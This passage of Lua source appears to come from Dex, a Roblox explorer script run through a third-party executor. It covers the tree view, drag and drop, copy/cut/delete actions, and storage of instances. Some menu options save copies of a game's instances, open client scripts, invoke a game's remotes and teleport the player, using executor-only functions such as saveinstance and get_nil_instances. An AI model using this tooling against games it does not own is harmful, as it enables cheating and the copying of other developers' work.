					list[i]:Clone().Parent = Selection.List[1].Parent or workspace
				end
			elseif option == "Delete" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					pcall(delete,list[i])
				end
				Selection:Set({})
			elseif option == "Group" then
				if not Option.Modifiable then return end
				local newModel = Instance.new("Model")
				local list = Selection:Get()
				newModel.Parent = Selection.List[1].Parent or workspace
				for i = 1,#list do
					list[i].Parent = newModel
				end
				Selection:Set({})
			elseif option == "Ungroup" then
				if not Option.Modifiable then return end
				local ungrouped = {}
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("Model") then
						for i2,v2 in pairs(list[i]:GetChildren()) do
							v2.Parent = list[i].Parent or workspace
							table.insert(ungrouped,v2)
						end		
						pcall(delete,list[i])			
					end
				end
				Selection:Set({})
				if SettingsRemote:Invoke("SelectUngrouped") then
					for i,v in pairs(ungrouped) do
						Selection:Add(v)
					end
				end
			elseif option == "Select Children" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				Selection:Set({})
				Selection:StopUpdates()
				for i = 1,#list do
					for i2,v2 in pairs(list[i]:GetChildren()) do
						Selection:Add(v2)
					end
				end
				Selection:ResumeUpdates()
			elseif option == "Teleport To" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("BasePart") then
						pcall(function()
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = list[i].CFrame
						end)
						break
					end
				end
			elseif option == "Insert Part" then
				if not Option.Modifiable then return end
				local insertedParts = {}
				local list = Selection:Get()
				for i = 1,#list do
					pcall(function()
						local newPart = Instance.new("Part")
						newPart.Parent = list[i]
						newPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.Head.Position) + Vector3.new(0,3,0)
						table.insert(insertedParts,newPart)
					end)
				end
			elseif option == "Save Instance" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				if #list == 1 then
					list[1].Archivable = true
					ypcall(function()PromptSaveInstance(list[1]:Clone())end)
				elseif #list > 1 then
					local newModel = Instance.new("Model")
					newModel.Name = "SavedInstances"
					for i = 1,#list do
						ypcall(function()
							list[i].Archivable = true
							list[i]:Clone().Parent = newModel
						end)
					end
					PromptSaveInstance(newModel)
				end
			elseif option == "Call Remote" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("RemoteFunction") or list[i]:IsA("RemoteEvent") then
						PromptRemoteCaller(list[i])
						break
					end
				end
			elseif option == "View Script" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("LocalScript") or list[i]:IsA("ModuleScript") then
						ScriptEditorEvent:Fire(list[i])
					end
				end
			end
	end)
	currentRightClickMenu.Parent = explorerPanel.Parent
	currentRightClickMenu.Position = UDim2.new(0,mouse.X,0,mouse.Y)
	if currentRightClickMenu.AbsolutePosition.X + currentRightClickMenu.AbsoluteSize.X > explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X then
		currentRightClickMenu.Position = UDim2.new(0, explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X - currentRightClickMenu.AbsoluteSize.X, 0, mouse.Y)
	end
end

local function cancelReparentDrag()end
local function cancelSelectDrag()end
do
	local listEntries = {}
	local nameConnLookup = {}

	local mouseDrag = Create('ImageButton',{
		Name = "MouseDrag";
		Position = UDim2.new(-0.25,0,-0.25,0);
		Size = UDim2.new(1.5,0,1.5,0);
		Transparency = 1;
		AutoButtonColor = false;
		Active = true;
		ZIndex = 10;
	})
	local function dragSelect(last,add,button)
		local connDrag
		local conUp

		conDrag = mouseDrag.MouseMoved:connect(function(x,y)
			local pos = Vector2.new(x,y) - listFrame.AbsolutePosition
			local size = listFrame.AbsoluteSize
			if pos.x < 0 or pos.x > size.x or pos.y < 0 or pos.y > size.y then return end

			local i = math.ceil(pos.y/ENTRY_BOUND) + scrollBar.ScrollIndex
			-- Mouse may have made a large step, so interpolate between the
			-- last index and the current.
			for n = i<last and i or last, i>last and i or last do
				local node = TreeList[n]
				if node then
					if add then
						Selection:Add(node.Object)
					else
						Selection:Remove(node.Object)
					end
				end
			end
			last = i
		end)

		function cancelSelectDrag()
			mouseDrag.Parent = nil
			conDrag:disconnect()
			conUp:disconnect()
			function cancelSelectDrag()end
		end

		conUp = mouseDrag[button]:connect(cancelSelectDrag)

		mouseDrag.Parent = GetScreen(listFrame)
	end

	local function dragReparent(object,dragGhost,clickPos,ghostOffset)
		local connDrag
		local conUp
		local conUp2

		local parentIndex = nil
		local dragged = false

		local parentHighlight = Create('Frame',{
			Transparency = 1;
			Visible = false;
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(1,0,0,1);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(1,0,0,0);
				Size = UDim2.new(0,1,1,0);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,1,0);
				Size = UDim2.new(1,0,0,1);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(0,1,1,0);
			});
		})
		SetZIndex(parentHighlight,9)

		conDrag = mouseDrag.MouseMoved:connect(function(x,y)
			local dragPos = Vector2.new(x,y)
			if dragged then
				local pos = dragPos - listFrame.AbsolutePosition
				local size = listFrame.AbsoluteSize

				parentIndex = nil
				parentHighlight.Visible = false
				if pos.x >= 0 and pos.x <= size.x and pos.y >= 0 and pos.y <= size.y + ENTRY_SIZE*2 then
					local i = math.ceil(pos.y/ENTRY_BOUND-2)
					local node = TreeList[i + scrollBar.ScrollIndex]
					if node and node.Object ~= object and not object:IsAncestorOf(node.Object) then
						parentIndex = i
						local entry = listEntries[i]
						if entry then
							parentHighlight.Visible = true
							parentHighlight.Position = UDim2.new(0,1,0,entry.AbsolutePosition.y-listFrame.AbsolutePosition.y)
							parentHighlight.Size = UDim2.new(0,size.x-4,0,entry.AbsoluteSize.y)
						end
					end
				end

				dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
			elseif (clickPos-dragPos).magnitude > 8 then
				dragged = true
				SetZIndex(dragGhost,9)
				dragGhost.IndentFrame.Transparency = 0.25
				dragGhost.IndentFrame.EntryText.TextColor3 = GuiColor.TextSelected
				dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
				dragGhost.Parent = GetScreen(listFrame)
				parentHighlight.Parent = listFrame
			end
		end)

		function cancelReparentDrag()
			mouseDrag.Parent = nil
			conDrag:disconnect()
			conUp:disconnect()
			conUp2:disconnect()
			dragGhost:Destroy()
			parentHighlight:Destroy()
			function cancelReparentDrag()end
		end

		local wasSelected = Selection.Selected[object]
		if not wasSelected and Option.Selectable then
			Selection:Set({object})
		end

		conUp = mouseDrag.MouseButton1Up:connect(function()
			cancelReparentDrag()
			if dragged then
				if parentIndex then
					local parentNode = TreeList[parentIndex + scrollBar.ScrollIndex]
					if parentNode then
						parentNode.Expanded = true

						local parentObj = parentNode.Object
						local function parent(a,b)
							a.Parent = b
						end
						if Option.Selectable then
							local list = Selection.List
							for i = 1,#list do
								pcall(parent,list[i],parentObj)
							end
						else
							pcall(parent,object,parentObj)
						end
					end
				end
			else
				-- do selection click
				if wasSelected and Option.Selectable then
					Selection:Set({})
				end
			end
		end)
		conUp2 = mouseDrag.MouseButton2Down:connect(function()
			cancelReparentDrag()
		end)

		mouseDrag.Parent = GetScreen(listFrame)
	end

	local entryTemplate = Create('ImageButton',{
		Name = "Entry";
		Transparency = 1;
		AutoButtonColor = false;
		Position = UDim2.new(0,0,0,0);
		Size = UDim2.new(1,0,0,ENTRY_SIZE);
		Create('Frame',{
			Name = "IndentFrame";
			BackgroundTransparency = 1;
			BackgroundColor3 = GuiColor.Selected;
			BorderColor3 = GuiColor.BorderSelected;
			Position = UDim2.new(0,0,0,0);
			Size = UDim2.new(1,0,1,0);
			Create(Icon('ImageButton',0),{
				Name = "Expand";
				AutoButtonColor = false;
				Position = UDim2.new(0,-GUI_SIZE,0.5,-GUI_SIZE/2);
				Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			});
			Create(Icon(nil,0),{
				Name = "ExplorerIcon";
				Position = UDim2.new(0,2+ENTRY_PADDING,0.5,-GUI_SIZE/2);
				Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			});
			Create('TextLabel',{
				Name = "EntryText";
				BackgroundTransparency = 1;
				TextColor3 = GuiColor.Text;
				TextXAlignment = 'Left';
				TextYAlignment = 'Center';
				Font = FONT;
				FontSize = FONT_SIZE;
				Text = "";
				Position = UDim2.new(0,2+ENTRY_SIZE+4,0,0);
				Size = UDim2.new(1,-2,1,0);
			});
		});
	})

	function scrollBar.UpdateCallback(self)
		for i = 1,self.VisibleSpace do
			local node = TreeList[i + self.ScrollIndex]
			if node then
				local entry = listEntries[i]
				if not entry then
					entry = Create(entryTemplate:Clone(),{
						Position = UDim2.new(0,2,0,ENTRY_BOUND*(i-1)+2);
						Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE);
						ZIndex = listFrame.ZIndex;
					})
					listEntries[i] = entry

					local expand = entry.IndentFrame.Expand
					expand.MouseEnter:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							if node.Expanded then
								Icon(expand,NODE_EXPANDED_OVER)
							else
								Icon(expand,NODE_COLLAPSED_OVER)
							end
						end
					end)
					expand.MouseLeave:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							if node.Expanded then
								Icon(expand,NODE_EXPANDED)
							else
								Icon(expand,NODE_COLLAPSED)
							end
						end
					end)
					expand.MouseButton1Down:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							node.Expanded = not node.Expanded
							if node.Object == explorerPanel.Parent and node.Expanded then
								CreateCaution("Warning","Please be careful when editing instances inside here, this is like the System32 of Dex and modifying objects here can break Dex.")
							end
							-- use raw update so the list updates instantly
							rawUpdateList()
						end
					end)

					entry.MouseButton1Down:connect(function(x,y)
						local node = TreeList[i + self.ScrollIndex]
						DestroyRightClick()
						if GetAwaitRemote:Invoke() then
							bindSetAwaiting:Fire(node.Object)
							return
						end
						
						if not HoldingShift then
							lastSelectedNode = i + self.ScrollIndex
						end
						
						if HoldingShift and not filteringWorkspace() then
							if lastSelectedNode then
								if i + self.ScrollIndex - lastSelectedNode > 0 then
									Selection:StopUpdates()
									for i2 = 1, i + self.ScrollIndex - lastSelectedNode do
										local newNode = TreeList[lastSelectedNode + i2]
										if newNode then
											Selection:Add(newNode.Object)
										end
									end
									Selection:ResumeUpdates()
								else
									Selection:StopUpdates()
									for i2 = i + self.ScrollIndex - lastSelectedNode, 1 do
										local newNode = TreeList[lastSelectedNode + i2]
										if newNode then
											Selection:Add(newNode.Object)
										end
									end
									Selection:ResumeUpdates()
								end
							end
							return
						end
						
						if HoldingCtrl then
							if Selection.Selected[node.Object] then
								Selection:Remove(node.Object)
							else
								Selection:Add(node.Object)
							end
							return
						end
						if Option.Modifiable then
							local pos = Vector2.new(x,y)
							dragReparent(node.Object,entry:Clone(),pos,entry.AbsolutePosition-pos)
						elseif Option.Selectable then
							if Selection.Selected[node.Object] then
								Selection:Set({})
							else
								Selection:Set({node.Object})
							end
							dragSelect(i+self.ScrollIndex,true,'MouseButton1Up')
						end
					end)

					entry.MouseButton2Down:connect(function()
						if not Option.Selectable then return end
						
						DestroyRightClick()
						
						curSelect = entry
						
						local node = TreeList[i + self.ScrollIndex]
						
						if GetAwaitRemote:Invoke() then
							bindSetAwaiting:Fire(node.Object)
							return
						end
						
						if not Selection.Selected[node.Object] then
							Selection:Set({node.Object})
						end
					end)
					
					
					entry.MouseButton2Up:connect(function()
						if not Option.Selectable then return end
						
						local node = TreeList[i + self.ScrollIndex]
						
						if checkMouseInGui(curSelect) then
							rightClickMenu(node.Object)
						end
					end)

					entry.Parent = listFrame
				end

				entry.Visible = true

				local object = node.Object

				-- update expand icon
				if #node == 0 then
					entry.IndentFrame.Expand.Visible = false
				elseif node.Expanded then
					Icon(entry.IndentFrame.Expand,NODE_EXPANDED)
					entry.IndentFrame.Expand.Visible = true
				else
					Icon(entry.IndentFrame.Expand,NODE_COLLAPSED)
					entry.IndentFrame.Expand.Visible = true
				end

				-- update explorer icon
				Icon(entry.IndentFrame.ExplorerIcon,ExplorerIndex[object.ClassName] or 0)

				-- update indentation
				local w = (node.Depth)*(2+ENTRY_PADDING+GUI_SIZE)
				entry.IndentFrame.Position = UDim2.new(0,w,0,0)
				entry.IndentFrame.Size = UDim2.new(1,-w,1,0)

				-- update name change detection
				if nameConnLookup[entry] then
					nameConnLookup[entry]:disconnect()
				end
				local text = entry.IndentFrame.EntryText
				text.Text = object.Name
				nameConnLookup[entry] = node.Object.Changed:connect(function(p)
					if p == 'Name' then
						text.Text = object.Name
					end
				end)

				-- update selection
				entry.IndentFrame.Transparency = node.Selected and 0 or 1
				text.TextColor3 = GuiColor[node.Selected and 'TextSelected' or 'Text']

				entry.Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE)
			elseif listEntries[i] then
				listEntries[i].Visible = false
			end
		end
		for i = self.VisibleSpace+1,self.TotalSpace do
			local entry = listEntries[i]
			if entry then
				listEntries[i] = nil
				entry:Destroy()
			end
		end
	end

	function scrollBarH.UpdateCallback(self)
		for i = 1,scrollBar.VisibleSpace do
			local node = TreeList[i + scrollBar.ScrollIndex]
			if node then
				local entry = listEntries[i]
				if entry then
					entry.Position = UDim2.new(0,2 - scrollBarH.ScrollIndex,0,ENTRY_BOUND*(i-1)+2)
				end
			end
		end
	end

	Connect(listFrame.Changed,function(p)
		if p == 'AbsoluteSize' then
			rawUpdateSize()
		end
	end)

	local wheelAmount = 6
	explorerPanel.MouseWheelForward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
		end
	end)
	explorerPanel.MouseWheelBackward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
		end
	end)
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Object detection

-- Inserts `v` into `t` at `i`. Also sets `Index` field in `v`.
local function insert(t,i,v)
	for n = #t,i,-1 do
		local v = t[n]
		v.Index = n+1
		t[n+1] = v
	end
	v.Index = i
	t[i] = v
end

-- Removes `i` from `t`. Also sets `Index` field in removed value.
local function remove(t,i)
	local v = t[i]
	for n = i+1,#t do
		local v = t[n]
		v.Index = n-1
		t[n-1] = v
	end
	t[#t] = nil
	v.Index = 0
	return v
end

-- Returns how deep `o` is in the tree.
local function depth(o)
	local d = -1
	while o do
		o = o.Parent
		d = d + 1
	end
	return d
end


local connLookup = {}

-- Returns whether a node would be present in the tree list
local function nodeIsVisible(node)
	local visible = true
	node = node.Parent
	while node and visible do
		visible = visible and node.Expanded
		node = node.Parent
	end
	return visible
end

-- Removes an object's tree node. Called when the object stops existing in the
-- game tree.
local function removeObject(object)
	local objectNode = NodeLookup[object]
	if not objectNode then
		return
	end

	local visible = nodeIsVisible(objectNode)

	Selection:Remove(object,true)

	local parent = objectNode.Parent
	remove(parent,objectNode.Index)
	NodeLookup[object] = nil
	connLookup[object]:disconnect()
	connLookup[object] = nil

	if visible then
		updateList()
	elseif nodeIsVisible(parent) then
		updateScroll()
	end
end

-- Moves a tree node to a new parent. Called when an existing object's parent
-- changes.
local function moveObject(object,parent)
	local objectNode = NodeLookup[object]
	if not objectNode then
		return
	end

	local parentNode = NodeLookup[parent]
	if not parentNode then
		return
	end

	local visible = nodeIsVisible(objectNode)

	remove(objectNode.Parent,objectNode.Index)
	objectNode.Parent = parentNode

	objectNode.Depth = depth(object)
	local function r(node,d)
		for i = 1,#node do
			node[i].Depth = d
			r(node[i],d+1)
		end
	end
	r(objectNode,objectNode.Depth+1)

	insert(parentNode,#parentNode+1,objectNode)

	if visible or nodeIsVisible(objectNode) then
		updateList()
	elseif nodeIsVisible(objectNode.Parent) then
		updateScroll()
	end
end

-- ScriptContext['/Libraries/LibraryRegistration/LibraryRegistration']
-- This RobloxLocked object lets me index its properties for some reason

local function check(object)
	return object.AncestryChanged
end

-- Creates a new tree node from an object. Called when an object starts
-- existing in the game tree.
local function addObject(object,noupdate)
	if script then
		-- protect against naughty RobloxLocked objects
		local s = pcall(check,object)
		if not s then
			return
		end
	end

	local parentNode = NodeLookup[object.Parent]
	if not parentNode then
		return
	end

	local objectNode = {
		Object = object;
		Parent = parentNode;
		Index = 0;
		Expanded = false;
		Selected = false;
		Depth = depth(object);
	}

	connLookup[object] = Connect(object.AncestryChanged,function(c,p)
		if c == object then
			if p == nil then
				removeObject(c)
			else
				moveObject(c,p)
			end
		end
	end)

	NodeLookup[object] = objectNode
	insert(parentNode,#parentNode+1,objectNode)

	if not noupdate then
		if nodeIsVisible(objectNode) then
			updateList()
		elseif nodeIsVisible(objectNode.Parent) then
			updateScroll()
		end
	end
end

local function makeObject(obj,par)
	local newObject = Instance.new(obj.ClassName)
	for i,v in pairs(obj.Properties) do
		ypcall(function()
			local newProp
			newProp = ToPropValue(v.Value,v.Type)
			newObject[v.Name] = newProp
		end)
	end
	newObject.Parent = par
end

local function writeObject(obj)
	local newObject = {ClassName = obj.ClassName, Properties = {}}
	for i,v in pairs(RbxApi.GetProperties(obj.className)) do
		if v["Name"] ~= "Parent" then
			print("thispassed")
			table.insert(newObject.Properties,{Name = v["Name"], Type = v["ValueType"], Value = tostring(obj[v["Name"]])})
		end
	end
	return newObject
end

local function buildDexStorage()
	local localDexStorage
	
	local success,err = ypcall(function()
		localDexStorage = game:GetObjects("rbxasset://DexStorage.rbxm")[1]
	end)
	
	if success and localDexStorage then
		for i,v in pairs(localDexStorage:GetChildren()) do
			ypcall(function()
				v.Parent = DexStorageMain
			end)
		end
	end
	
	updateDexStorageListeners()
	--[[
	local localDexStorage = readfile(getelysianpath().."DexStorage.txt")--game:GetService("CookiesService"):GetCookieValue("DexStorage")
	--local success,err = pcall(function()
		if localDexStorage then
			local objTable = game:GetService("HttpService"):JSONDecode(localDexStorage)
			for i,v in pairs(objTable) do
				makeObject(v,DexStorageMain)
			end
		end
	--end)
	--]]
end

local dexStorageDebounce = false
local dexStorageListeners = {}

local function updateDexStorage()
	if dexStorageDebounce then return end
	dexStorageDebounce = true	
	
	wait()
	
	pcall(function()
		saveinstance("content//DexStorage.rbxm",DexStorageMain)
	end)
	
	updateDexStorageListeners()
	
	dexStorageDebounce = false
	--[[
	local success,err = ypcall(function()
		local objs = {}
		for i,v in pairs(DexStorageMain:GetChildren()) do
			table.insert(objs,writeObject(v))
		end
		writefile(getelysianpath().."DexStorage.txt",game:GetService("HttpService"):JSONEncode(objs))
		--game:GetService("CookiesService"):SetCookieValue("DexStorage",game:GetService("HttpService"):JSONEncode(objs))
	end)
	if err then
		CreateCaution("DexStorage Save Fail!","DexStorage broke! If you see this message, report to Raspberry Pi!")
	end
	print("hi")
	--]]
end

function updateDexStorageListeners()
	for i,v in pairs(dexStorageListeners) do
		v:Disconnect()
	end
	dexStorageListeners = {}
	for i,v in pairs(DexStorageMain:GetChildren()) do
		pcall(function()
			local ev = v.Changed:connect(updateDexStorage)
			table.insert(dexStorageListeners,ev)
		end)
	end
end

do
	NodeLookup[workspace.Parent] = {
		Object = workspace.Parent;
		Parent = nil;
		Index = 0;
		Expanded = true;
	}
	
	if DexStorageEnabled then
		NodeLookup[DexStorage] = {
			Object = DexStorage;
			Parent = nil;
			Index = 0;
			Expanded = true;
		}
	end
	
	if NilStorageEnabled then
		NodeLookup[NilStorage] = {
			Object = NilStorage;
			Parent = nil;
			Index = 0;
			Expanded = true;
		}
	end

	Connect(game.DescendantAdded,addObject)
	Connect(game.DescendantRemoving,removeObject)
	
	if DexStorageEnabled then
		--[[
		if readfile(getelysianpath().."DexStorage.txt") == nil then
			writefile(getelysianpath().."DexStorage.txt","")
		end
		--]]
		
		buildDexStorage()
	
		Connect(DexStorage.DescendantAdded,addObject)
		Connect(DexStorage.DescendantRemoving,removeObject)
	
		Connect(DexStorage.DescendantAdded,updateDexStorage)
		Connect(DexStorage.DescendantRemoving,updateDexStorage)
	end
	
	if NilStorageEnabled then
		Connect(NilStorage.DescendantAdded,addObject)
		Connect(NilStorage.DescendantRemoving,removeObject)		
		
		local currentTable = get_nil_instances()	
		
		spawn(function()
			while wait() do
				if #currentTable ~= #get_nil_instances() then
					currentTable = get_nil_instances()
					--NilStorageMain:ClearAllChildren()
					for i,v in pairs(get_nil_instances()) do
						if v ~= NilStorage and v ~= DexStorage then
							pcall(function()
								v.Parent = NilStorageMain
							end)
							--[[
							local newNil = v
							newNil.Archivable = true
							newNil:Clone().Parent = NilStorageMain
							--]]
						end
					end
				end
			end
		end)
	end

	local function get(o)
		return o:GetChildren()
	end

	local function r(o)
		local s,children = pcall(get,o)
		if s then
			for i = 1,#children do
				addObject(children[i],true)
				r(children[i])
			end
		end
	end

	r(workspace.Parent)
	if DexStorageEnabled then
		r(DexStorage)
	end
	if NilStorageEnabled then
		r(NilStorage)
	end

	scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
	updateList()
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Actions

local actionButtons do
	actionButtons = {}

	local totalActions = 1
	local currentActions = totalActions
	local function makeButton(icon,over,name,vis,cond)
		local buttonEnabled = false
		
		local button = Create(Icon('ImageButton',icon),{
			Name = name .. "Button";
			Visible = Option.Modifiable and Option.Selectable;
			Position = UDim2.new(1,-(GUI_SIZE+2)*currentActions+2,0.25,-GUI_SIZE/2);
			Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			Parent = headerFrame;
		})

		local tipText = Create('TextLabel',{
			Name = name .. "Text";
			Text = name;
			Visible = false;
			BackgroundTransparency = 1;
			TextXAlignment = 'Right';
			Font = FONT;
			FontSize = FONT_SIZE;
			Position = UDim2.new(0,0,0,0);
			Size = UDim2.new(1,-(GUI_SIZE+2)*totalActions,1,0);
			Parent = headerFrame;
		})

		
		button.MouseEnter:connect(function()
			if buttonEnabled then
				button.BackgroundTransparency = 0.9
			end
			--Icon(button,over)
			--tipText.Visible = true
		end)
		button.MouseLeave:connect(function()
			button.BackgroundTransparency = 1
			--Icon(button,icon)
			--tipText.Visible = false
		end)

		currentActions = currentActions + 1
		actionButtons[#actionButtons+1] = {Obj = button,Cond = cond}
		QuickButtons[#actionButtons+1] = {Obj = button,Cond = cond, Toggle = function(on)
			if on then
				buttonEnabled = true
				Icon(button,over)
			else
				buttonEnabled = false
				Icon(button,icon)
			end
		end}
		return button
	end

	--local clipboard = {}
	local function delete(o)
		o.Parent = nil
	end
	
	makeButton(ACTION_EDITQUICKACCESS,ACTION_EDITQUICKACCESS,"Options",true,function()return true end).MouseButton1Click:connect(function()
		
	end)
	

	-- DELETE
	makeButton(ACTION_DELETE,ACTION_DELETE_OVER,"Delete",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		local list = Selection:Get()
		for i = 1,#list do
			pcall(delete,list[i])
		end
		Selection:Set({})
	end)
	
	-- PASTE
	makeButton(ACTION_PASTE,ACTION_PASTE_OVER,"Paste",true,function() return #Selection:Get() > 0 and #clipboard > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		local parent = Selection.List[1] or workspace
		for i = 1,#clipboard do
			clipboard[i]:Clone().Parent = parent
		end
	end)
	
	-- COPY
	makeButton(ACTION_COPY,ACTION_COPY_OVER,"Copy",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		clipboard = {}
		local list = Selection.List
		for i = 1,#list do
			table.insert(clipboard,list[i]:Clone())
		end
		updateActions()
	end)
	
	-- CUT
	makeButton(ACTION_CUT,ACTION_CUT_OVER,"Cut",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		clipboard = {}
		local list = Selection.List
		local cut = {}
		for i = 1,#list do
			local obj = list[i]:Clone()
			if obj then
				table.insert(clipboard,obj)
				table.insert(cut,list[i])
			end
		end
		for i = 1,#cut do
			pcall(delete,cut[i])
		end
		updateActions()
	end)
	
	-- FREEZE
	makeButton(ACTION_FREEZE,ACTION_FREEZE,"Freeze",true,function() return true end)
	
	-- ADD/REMOVE STARRED
	makeButton(ACTION_ADDSTAR,ACTION_ADDSTAR_OVER,"Star",true,function() return #Selection:Get() > 0 end)
	
	-- STARRED
	makeButton(ACTION_STARRED,ACTION_STARRED,"Starred",true,function() return true end)


	-- SORT
	-- local actionSort = makeButton(ACTION_SORT,ACTION_SORT_OVER,"Sort")
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Option Bindables

do
	local optionCallback = {
		Modifiable = function(value)
			for i = 1,#actionButtons do
				actionButtons[i].Obj.Visible = value and Option.Selectable
			end
			cancelReparentDrag()
		end;
		Selectable = function(value)
			for i = 1,#actionButtons do
				actionButtons[i].Obj.Visible = value and Option.Modifiable
			end
			cancelSelectDrag()
			Selection:Set({})
		end;
	}

	local bindSetOption = explorerPanel:FindFirstChild("SetOption")
	if not bindSetOption then
		bindSetOption = Create('BindableFunction',{Name = "SetOption"})
		bindSetOption.Parent = explorerPanel
	end

	bindSetOption.OnInvoke = function(optionName,value)
		if optionCallback[optionName] then
			Option[optionName] = value
			optionCallback[optionName](value)
		end
	end

	local bindGetOption = explorerPanel:FindFirstChild("GetOption")
	if not bindGetOption then
		bindGetOption = Create('BindableFunction',{Name = "GetOption"})
		bindGetOption.Parent = explorerPanel
	end

	bindGetOption.OnInvoke = function(optionName)
		if optionName then
			return Option[optionName]
		else
			local options = {}
			for k,v in pairs(Option) do
				options[k] = v
			end
			return options
		end
	end
end

function SelectionVar()
	return Selection
end

Input.InputBegan:connect(function(key)
	if key.KeyCode == Enum.KeyCode.LeftControl then
		HoldingCtrl = true
	end
	if key.KeyCode == Enum.KeyCode.LeftShift then
		HoldingShift = true
	end
end)

Input.InputEnded:connect(function(key)
	if key.KeyCode == Enum.KeyCode.LeftControl then
		HoldingCtrl = false
	end
	if key.KeyCode == Enum.KeyCode.LeftShift then
		HoldingShift = false
	end
end)

while RbxApi == nil do
	RbxApi = GetApiRemote:Invoke()
	wait()
end

explorerFilter.Changed:connect(function(prop)
	if prop == "Text" then
		rawUpdateList()
	end
end)

CurrentInsertObjectWindow = CreateInsertObjectMenu(
	GetClasses(),
	"",
	false,
	function(option)
		CurrentInsertObjectWindow.Visible = false
		local list = SelectionVar():Get()
		for i = 1,#list do
			pcall(function() Instance.new(option,list[i]) end)
		end
		DestroyRightClick()
	end
)
end)
spawn(function()
	--[[
	
Change log:

09/18
	Fixed checkbox mouseover sprite
	Encapsulated checkbox creation into separate method
	Fixed another checkbox issue

09/15
	Invalid input is ignored instead of setting to default of that data type
	Consolidated control methods and simplified them
	All input goes through ToValue method
	Fixed position of BrickColor palette
	Made DropDown appear above row if it would otherwise exceed the page height
	Cleaned up stylesheets

09/14
	Made properties window scroll when mouse wheel scrolled
	Object/Instance and Color3 data types handled properly
	Multiple BrickColor controls interfering with each other fixed
	Added support for Content data type
	
--]]

wait(0.2)

local print = function(s)
	print(tostring(s))
end

-- Services
local Teams = game:GetService("Teams")
local Workspace = game:GetService("Workspace")
local Debris = game:GetService("Debris")
local ContentProvider = game:GetService("ContentProvider")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Functions
function httpGet(url)
	return game:HttpGet(url,true)
end

-- RbxApi Stuff

local apiUrl = "http://anaminus.github.io/rbx/json/api/latest.json"
local maxChunkSize = 100 * 1000
local ApiJson
if script:FindFirstChild("RawApiJson") then
	ApiJson = script.RawApiJson
else
	ApiJson = ""
end


function getLocalApiJson()
	local rawApiJson = [===[
	[{"Superclass":null,"type":"Class","Name":"Instance","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Archivable","tags":[],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"ClassName","tags":["readonly"],"Class":"Instance"},{"ValueType":"int","type":"Property","Name":"DataCost","tags":["RobloxPlaceSecurity","readonly"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"Name","tags":[],"Class":"Instance"},{"ValueType":"Object","type":"Property","Name":"Parent","tags":[],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"RobloxLocked","tags":["PluginSecurity"],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"archivable","tags":["hidden"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"className","tags":["deprecated","readonly"],"Class":"Instance"},{"ReturnType":"void","Arguments":[],"Name":"ClearAllChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"Clone","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Destroy","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"